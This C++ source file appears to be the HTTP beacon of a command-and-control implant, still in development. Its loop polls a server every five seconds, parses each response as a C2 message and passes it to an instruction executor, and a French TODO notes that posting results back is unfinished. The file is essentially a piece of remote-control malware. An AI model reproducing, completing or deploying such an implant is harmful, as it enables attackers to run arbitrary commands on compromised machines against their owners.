#include "BeaconHttp.hpp"

#include <chrono>
#include <thread>


using namespace std;
using namespace httplib;


BeaconHttp::BeaconHttp()
	: Beacon()
{
}


BeaconHttp::~BeaconHttp()
{
}


int BeaconHttp::runHttp()
{
	bool exit = false;
	while (!exit)
	{
		string cmd;

		std::cout << "cmd; " << std::endl;

		httplib::Client cli("localhost", 8080);

		if (auto res = cli.Get("/hi")) 
		{
			if (res->status == 200) 
			{
				std::cout << res->body << std::endl;
				cmd = res->body;

				C2Message c2Message;
				c2Message.ParseFromArray(cmd.data(), (int)cmd.size());
				C2Message c2RetMessage;

				exit = execInstruction(c2Message, c2RetMessage);

				string out;
				c2RetMessage.SerializeToString(&out);

				std::cout << "out " << out << std::endl;

				// TODO envoye dans le post ou get
			}
		}
		else
		{
			auto err = res.error();
		}

		std::this_thread::sleep_for(std::chrono::milliseconds(5000));
	}

	return 0;
}